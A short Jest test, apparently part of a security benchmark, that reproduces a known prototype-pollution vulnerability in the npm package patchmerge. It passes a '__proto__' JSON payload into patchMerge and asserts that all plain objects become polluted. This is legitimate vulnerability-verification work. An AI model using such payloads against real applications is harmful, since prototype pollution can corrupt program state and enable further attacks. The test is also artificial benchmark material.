//https://security.snyk.io/vuln/SNYK-JS-PATCHMERGE-1086585
test("prototype pollution in patchMerge", () => {
  var patchMerge = require("patchmerge");
  var obj = {};
  expect({}.polluted).toBe(undefined);
  patchMerge(obj, JSON.parse(process.env.SECBENCH_PAYLOAD || '{"__proto__": { "polluted": "yes" }}'));
  expect({}.polluted).toBe("yes");
});
